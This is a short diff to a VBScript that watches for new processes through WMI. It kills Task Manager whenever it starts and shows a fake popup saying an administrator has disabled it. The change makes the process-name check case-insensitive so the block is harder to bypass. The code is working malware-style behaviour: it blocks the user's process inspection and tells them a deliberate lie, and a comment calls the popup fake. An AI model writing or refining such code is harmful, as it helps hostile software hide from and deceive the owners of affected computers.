@@ -4,7 +4,7 @@ Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!//
 Set colMonitoredProcesses = objWMIService.ExecNotificationQuery("select * from __instancecreationevent " & " within 1 where TargetInstance isa 'Win32_Process'")
 Do
     Set objLatestProcess = colMonitoredProcesses.NextEvent
-    If objLatestProcess.TargetInstance.Name = "taskmgr.exe" Then
+    If LCase(objLatestProcess.TargetInstance.Name) = "taskmgr.exe" Then
         objLatestProcess.TargetInstance.Terminate
     ' fake popup message
 		objWshShl.Popup "Task Manager has been disabled by your administrator.", 3, "Task Manager", 16
